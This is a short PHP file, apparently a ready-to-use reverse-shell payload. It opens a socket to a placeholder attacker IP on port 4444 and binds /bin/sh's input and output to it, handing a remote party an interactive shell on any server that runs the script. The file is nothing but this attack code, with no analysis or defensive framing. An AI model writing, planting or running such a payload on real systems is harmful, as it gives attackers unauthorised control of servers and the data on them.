<?php
$ip = 'YOUR_IP';      // Attacker IP
$port = 4444;         // Attacker Port

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', [
  0 => $sock,  // STDIN
  1 => $sock,  // STDOUT
  2 => $sock   // STDERR
], $pipes);
?>
